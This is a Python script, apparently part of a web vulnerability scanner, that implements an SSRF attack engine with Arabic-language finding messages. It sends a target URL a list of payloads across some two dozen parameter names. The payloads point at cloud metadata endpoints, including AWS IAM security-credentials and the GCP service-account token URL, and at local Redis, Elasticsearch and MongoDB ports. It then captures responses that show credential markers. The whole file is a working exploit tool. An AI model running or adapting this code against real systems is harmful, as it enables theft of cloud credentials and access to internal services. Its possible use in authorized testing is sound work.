#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, sys, json, re, time
from urllib.parse import urlparse, urljoin

try:
    import requests
except ImportError:
    requests = None

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost:8080/admin",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:27017/"
]

SSRF_PARAM_KEYWORDS = [
    "url", "uri", "link", "src", "source", "dest", "target", "redirect", 
    "next", "callback", "webhook", "fetch", "load", "image", "img", "file", 
    "path", "proxy", "u", "site", "domain", "host", "feed", "data"
]

class WebSSRFEngine:
    def __init__(self, target_url, session=None, on_finding=None, on_step=None, verbose=True):
        self.target_url = target_url
        self.session = session or (requests.Session() if requests else None)
        self.on_finding = on_finding
        self.on_step = on_step
        self.verbose = verbose
        self.findings = []

    def log(self, msg):
        if self.verbose:
            try: print(msg)
            except Exception: pass

    def _emit_finding(self, f):
        self.findings.append(f)
        if self.on_finding:
            self.on_finding(f)

    def run(self):
        self.log("[SSRF Engine] ⚡ Starting SSRF & Cloud Metadata Assessment...")
        if not self.session: return self.findings
        self._test_ssrf()
        return self.findings

    def _test_ssrf(self):
        for param in SSRF_PARAM_KEYWORDS:
            for payload in SSRF_PAYLOADS:
                try:
                    sep = '?' if '?' not in self.target_url else '&'
                    test_url = self.target_url + sep + param + "=" + payload
                    resp = self.session.get(test_url, timeout=6)
                    if resp and resp.status_code == 200 and len(resp.text) > 10:
                        if any(kw in resp.text.lower() for kw in ["ami-id", "security-credentials", "accesskeyid", "root:x", "redis_version", "cluster_name", "instance-id", "computemetadata"]):
                            self._emit_finding({
                                "type": "ssrf_cloud_metadata",
                                "title": "ثغرة SSRF موصلة لبيانات السحابة الحساسة",
                                "severity": "critical",
                                "detail": f"تم استخدام البرامتر {param} للوصول إلى {payload} واستخراج بيانات السحابة الحساسة.",
                                "url": test_url,
                                "evidence": [f"Param: {param}", f"Payload: {payload}", f"Response Snippet: {resp.text[:150]}"]
                            })
                            return
                except Exception:
                    continue

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    eng = WebSSRFEngine(target)
    res = eng.run()
    print(f"\nFinished. Total findings: {len(res)}")
